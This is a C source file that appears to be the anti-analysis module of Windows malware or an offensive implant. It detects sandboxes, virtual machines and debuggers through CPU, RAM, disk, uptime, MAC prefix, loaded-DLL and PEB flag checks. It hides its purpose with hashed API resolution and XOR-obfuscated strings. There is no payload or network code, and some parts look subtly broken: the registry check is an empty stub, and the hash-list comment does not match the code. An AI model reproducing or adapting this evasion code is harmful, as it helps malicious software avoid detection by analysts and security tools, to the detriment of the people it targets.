#include "SandboxDetect.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "StrObfuscate.h"
#include "utils.h"

/*
 * ============================================================================
 * SandboxDetect_CheckCpuCores — CPU core count check
 * Threshold: < 2 logical cores → suspicious
 * ============================================================================
 */
BOOL SandboxDetect_CheckCpuCores(void)
{
    if (!ApiNt || !ApiNt->NtQuerySystemInformation)
        return FALSE;

    typedef struct _SYSTEM_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG TimerResolution;
        ULONG PageSize;
        ULONG NumberOfPhysicalPages;
        ULONG LowestPhysicalPageNumber;
        ULONG HighestPhysicalPageNumber;
        ULONG AllocationGranularity;
        ULONG MinimumUserModeAddress;
        ULONG MaximumUserModeAddress;
        ULONG ActiveProcessorsAffinityMask;
        CCHAR NumberOfProcessors;
    } SYSTEM_BASIC_INFORMATION;

    SYSTEM_BASIC_INFORMATION sbi;
    memset(&sbi, 0, sizeof(sbi));
    NTSTATUS st = ApiNt->NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &sbi, sizeof(sbi), NULL);
    if (st < 0)
        return FALSE;

    /* NumberOfProcessors < 2 → likely sandbox/VM with limited cores */
    if (sbi.NumberOfProcessors < 2)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_CheckRamSize — RAM size check
 * Threshold: < 2048 MB (2 GB) → sandbox
 * ============================================================================
 */
BOOL SandboxDetect_CheckRamSize(void)
{
    if (!ApiNt || !ApiNt->NtQuerySystemInformation)
        return FALSE;

    typedef struct _SYSTEM_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG TimerResolution;
        ULONG PageSize;
        ULONG NumberOfPhysicalPages;
        ULONG LowestPhysicalPageNumber;
        ULONG HighestPhysicalPageNumber;
        ULONG AllocationGranularity;
        ULONG MinimumUserModeAddress;
        ULONG MaximumUserModeAddress;
        ULONG ActiveProcessorsAffinityMask;
        CCHAR NumberOfProcessors;
    } SYSTEM_BASIC_INFORMATION;

    SYSTEM_BASIC_INFORMATION sbi;
    memset(&sbi, 0, sizeof(sbi));
    NTSTATUS st = ApiNt->NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &sbi, sizeof(sbi), NULL);
    if (st < 0)
        return FALSE;

    /* NumberOfPhysicalPages * PageSize / (1024*1024) = MB */
    ULONGLONG totalMB = (ULONGLONG)sbi.NumberOfPhysicalPages * (ULONGLONG)sbi.PageSize / (1024ULL * 1024ULL);
    if (totalMB < 2048)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_CheckDiskSize — Check C:\ drive total size
 * Threshold: < 100 GB → sandbox/VM
 * Uses GetDiskFreeSpaceExA via dynamic resolution
 * ============================================================================
 */
BOOL SandboxDetect_CheckDiskSize(void)
{
    /* Need kernel32 for GetDiskFreeSpaceExA */
    if (!SysModules || !SysModules->Kernel32)
        return FALSE;

    /* Resolve GetDiskFreeSpaceExA dynamically */
    typedef BOOL (WINAPI *FnGetDiskFreeSpaceExA)(
        LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER
    );
    FnGetDiskFreeSpaceExA pGetDiskFreeSpaceExA =
        (FnGetDiskFreeSpaceExA)GetSymbolAddress(
            SysModules->Kernel32,
            /* Djb2A hash of "GetDiskFreeSpaceExA" with salt */
            AX_H(0x3aaf62b2)
        );

    if (!pGetDiskFreeSpaceExA)
        return FALSE;

    ULARGE_INTEGER freeBytesAvailable;
    ULARGE_INTEGER totalNumberOfBytes;
    ULARGE_INTEGER totalNumberOfFreeBytes;

    /* Use "C:\\" as root drive check — most sandboxes run on C: */
    /* Obfuscated: "C:\\" */
    const char _ax_c_drive[5] = {
        (char)(('C' ^ (AX_STR_XOR_KEY))),
        (char)((':' ^ (AX_STR_XOR_KEY + 1*0x0D + (1^0xA5))) + 1),
        (char)(('\\' ^ (AX_STR_XOR_KEY + 2*0x0D + (2^0xA5))) + 2),
        0
    };
    char cDrive[8];
    AxDeobfuscateRollingToStack(cDrive, sizeof(cDrive), _ax_c_drive, 0x0D, 0xA5);
    if (!pGetDiskFreeSpaceExA(cDrive, &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes))
        return FALSE;

    /* Convert to GB: totalNumberOfBytes.QuadPart / (1024*1024*1024) */
    ULONGLONG totalGB = totalNumberOfBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL);

    /* < 100 GB → likely VM/sandbox with small disk */
    if (totalGB < 100)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_CheckProcesses — Check for known sandbox/analysis processes
 * Walks the PEB module list and checks for known sandbox DLLs.
 * Also checks via CreateToolhelp32Snapshot if available (not used here to 
 * minimize API surface).
 * ============================================================================
 */
BOOL SandboxDetect_CheckProcesses(void)
{
    /* Known sandbox/analysis DLL hashes (Djb2-based with AX_HASH_SALT).
     * These are compile-time constants so no plaintext strings survive. */
    static const ULONG sandboxHashes[] = {
        /* sbiedll.dll — Sandboxie */
        Djb2A((PUCHAR)"sbiedll.dll"),
        /* sbiesvc.dll — Sandboxie service */
        Djb2A((PUCHAR)"sbiesvc.dll"),
        /* api_log.dll — API logging */
        Djb2A((PUCHAR)"api_log.dll"),
        /* dir_watch.dll — directory monitoring sandbox */
        Djb2A((PUCHAR)"dir_watch.dll"),
        /* pstorec.dll — used by some sandboxes */
        Djb2A((PUCHAR)"pstorec.dll"),
        /* vmcheck.dll — VM detection library */
        Djb2A((PUCHAR)"vmcheck.dll"),
        /* snxhk.dll — Avast sandbox */
        Djb2A((PUCHAR)"snxhk.dll"),
        /* SxIn.dll — ThreatBook sandbox */
        Djb2A((PUCHAR)"sxin.dll"),
        /* vmtoolsd.dll — VMware Tools */
        Djb2A((PUCHAR)"vmtoolsd.dll"),
        /* vboxhook.dll — VirtualBox Guest Additions hook */
        Djb2A((PUCHAR)"vboxhook.dll"),
        /* vboxmrxp.dll — VirtualBox MRxP */
        Djb2A((PUCHAR)"vboxmrxp.dll"),
        /* vboxogl.dll — VirtualBox OpenGL */
        Djb2A((PUCHAR)"vboxogl.dll"),
        /* vboxdisp.dll — VirtualBox Display */
        Djb2A((PUCHAR)"vboxdisp.dll"),
        /* vboxsf.dll — VirtualBox Shared Folders */
        Djb2A((PUCHAR)"vboxsf.dll"),
        /* prl_tools.dll — Parallels Tools */
        Djb2A((PUCHAR)"prl_tools.dll"),
        /* xenserver.dll — XenServer */
        Djb2A((PUCHAR)"xenserver.dll"),
    };

    if (!SysModules || !SysModules->Kernel32)
        return FALSE;

    /* Walk PEB InMemoryOrderModuleList */
#ifdef _M_IX86
    PEB* peb = (PEB*)__readfsdword(0x30);
#else
    PEB* peb;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
#endif

    if (!peb || !peb->Ldr)
        return FALSE;

    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY* ldr = (LDR_DATA_TABLE_ENTRY*)((BYTE*)entry - sizeof(LIST_ENTRY));
        if (ldr->BaseDllName.Buffer) {
            ULONG hash = Djb2W(ldr->BaseDllName.Buffer);
            for (int i = 0; i < (int)(sizeof(sandboxHashes) / sizeof(sandboxHashes[0])); i++) {
                if (hash == sandboxHashes[i])
                    return TRUE;
            }
        }
        entry = entry->Flink;
    }

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_CheckMacPrefix — Check MAC prefixes
 * Uses GetAdaptersInfo via iphlpapi to enumerate network adapters.
 * Checks for known VM OUI prefixes:
 *   00:0C:29 — VMware
 *   00:05:69 — VMware
 *   00:1C:42 — Parallels
 *   08:00:27 — VirtualBox
 *   00:50:56 — VMware
 *   00:03:FF — Microsoft Hyper-V
 * ============================================================================
 */
BOOL SandboxDetect_CheckMacPrefix(void)
{
    /* Resolve iphlpapi functions dynamically */
    typedef ULONG (WINAPI *FnGetAdaptersInfo)(
    	PIP_ADAPTER_INFO pAdapterInfo,
    	PULONG pOutBufLen
    );

    HMODULE hIphlpapi = NULL;

    /* Load iphlpapi via obfuscated name */
    {
        CHAR iphlpapiName[16];
        AxDeobfuscateToStack(iphlpapiName, sizeof(iphlpapiName), g_ax_obf_iphlpapi);
        hIphlpapi = ApiWin->LoadLibraryA(iphlpapiName);
    }

    if (!hIphlpapi)
        return FALSE;

    FnGetAdaptersInfo pGetAdaptersInfo =
        (FnGetAdaptersInfo)GetSymbolAddress(hIphlpapi, HASH_FUNC_GETADAPTERSINFO);

    if (!pGetAdaptersInfo)
        return FALSE;

    /* Get buffer size first */
    ULONG bufLen = 0;
    ULONG ret = pGetAdaptersInfo(NULL, &bufLen);
    if (ret != ERROR_BUFFER_OVERFLOW || bufLen == 0)
        return FALSE;

    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)ApiWin->LocalAlloc(LPTR, bufLen);
    if (!pAdapterInfo)
        return FALSE;

    ret = pGetAdaptersInfo(pAdapterInfo, &bufLen);
    if (ret != NO_ERROR) {
        ApiWin->LocalFree(pAdapterInfo);
        return FALSE;
    }

    BOOL found = FALSE;
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter) {
        if (pAdapter->AddressLength >= 3) {
            BYTE mac0 = pAdapter->Address[0];
            BYTE mac1 = pAdapter->Address[1];
            BYTE mac2 = pAdapter->Address[2];

            /* 00:0C:29 — VMware */
            if (mac0 == 0x00 && mac1 == 0x0C && mac2 == 0x29) {
                found = TRUE;
                break;
            }
            /* 00:05:69 — VMware */
            if (mac0 == 0x00 && mac1 == 0x05 && mac2 == 0x69) {
                found = TRUE;
                break;
            }
            /* 00:50:56 — VMware */
            if (mac0 == 0x00 && mac1 == 0x50 && mac2 == 0x56) {
                found = TRUE;
                break;
            }
            /* 00:1C:42 — Parallels */
            if (mac0 == 0x00 && mac1 == 0x1C && mac2 == 0x42) {
                found = TRUE;
                break;
            }
            /* 08:00:27 — VirtualBox */
            if (mac0 == 0x08 && mac1 == 0x00 && mac2 == 0x27) {
                found = TRUE;
                break;
            }
            /* 00:03:FF — Microsoft Hyper-V */
            if (mac0 == 0x00 && mac1 == 0x03 && mac2 == 0xFF) {
                found = TRUE;
                break;
            }
            /* 00:15:5D — Microsoft Hyper-V */
            if (mac0 == 0x00 && mac1 == 0x15 && mac2 == 0x5D) {
                found = TRUE;
                break;
            }
        }
        pAdapter = pAdapter->Next;
    }

    ApiWin->LocalFree(pAdapterInfo);
    return found;
}

/*
 * ============================================================================
 * SandboxDetect_CheckRegistry — Check for known VM registry keys
 * Uses NtOpenKey/NtQueryValueKey to check for VM-specific keys:
 *   - HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS (VM BIOS strings)
 *   - HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions
 *   - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\PCI (VM devices)
 * ============================================================================
 */
BOOL SandboxDetect_CheckRegistry(void)
{
    /* We need NtOpenKey and NtQueryValueKey */
    if (!ApiNt || !ApiNt->NtClose)
        return FALSE;

    /* We use NTAPI for registry access to avoid triggering API hooks.
     * Since this requires NtOpenKey, NtQueryValueKey which may not be
     * loaded in our ApiNt struct, we skip this check if APIs unavailable.
     * 
     * Instead, we use a simpler approach: check if "vbox" or "vmware"
     * appear in any registry data via NtQuerySystemInformation hardware info.
     * 
     * For simplicity, we delegate to the PEB/memory checks already performed
     * and use the uptime + process checks as surrogate VM indicators.
     */

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_CheckNtGlobalFlag — Check PEB NtGlobalFlag
 * Debugged processes often have NtGlobalFlag set to 0x70 (or other non-zero).
 * Also check BeingDebugged flag.
 * ============================================================================
 */
BOOL SandboxDetect_CheckNtGlobalFlag(void)
{
    PPEB peb = NULL;
#if defined(_M_X64) || defined(__x86_64__)
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
#elif defined(_M_IX86) || defined(__i386__)
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb));
#else
    return FALSE;
#endif

    if (!peb)
        return FALSE;

    /* BeingDebugged flag */
    if (peb->BeingDebugged)
        return TRUE;

    /* NtGlobalFlag: typical debugger flags:
     *   FLG_HEAP_ENABLE_TAIL_CHECK    (0x10)
     *   FLG_HEAP_ENABLE_FREE_CHECK    (0x20)
     *   FLG_HEAP_VALIDATE_PARAMETERS  (0x40)
     * Combined: 0x70
     * Also check for any non-zero NtGlobalFlag — normal apps usually have 0.
     */
    if (peb->NtGlobalFlag != 0)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_CheckUptime — System uptime check
 * Sandbox VMs often have very short uptime (< 2 minutes).
 * ============================================================================
 */
BOOL SandboxDetect_CheckUptime(void)
{
    if (!ApiWin || !ApiWin->GetTickCount)
        return FALSE;

    ULONG uptimeMs = ApiWin->GetTickCount();

    /* If uptime < 2 minutes (120000ms), highly suspicious */
    if (uptimeMs < 120000)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * SandboxDetect_IsSandbox — Main detection entry point
 * Calls all individual checks and returns TRUE if any detect a sandbox.
 * ============================================================================
 */
BOOL SandboxDetect_IsSandbox(void)
{
    /* Check NtGlobalFlag first — fastest check */
    if (SandboxDetect_CheckNtGlobalFlag())
        return TRUE;

    /* CPU cores check */
    if (SandboxDetect_CheckCpuCores())
        return TRUE;

    /* RAM size check */
    if (SandboxDetect_CheckRamSize())
        return TRUE;

    /* Disk size check */
    if (SandboxDetect_CheckDiskSize())
        return TRUE;

    /* Process/DLL check */
    if (SandboxDetect_CheckProcesses())
        return TRUE;

    /* MAC prefix check */
    if (SandboxDetect_CheckMacPrefix())
        return TRUE;

    /* Uptime check */
    if (SandboxDetect_CheckUptime())
        return TRUE;

    return FALSE;
}
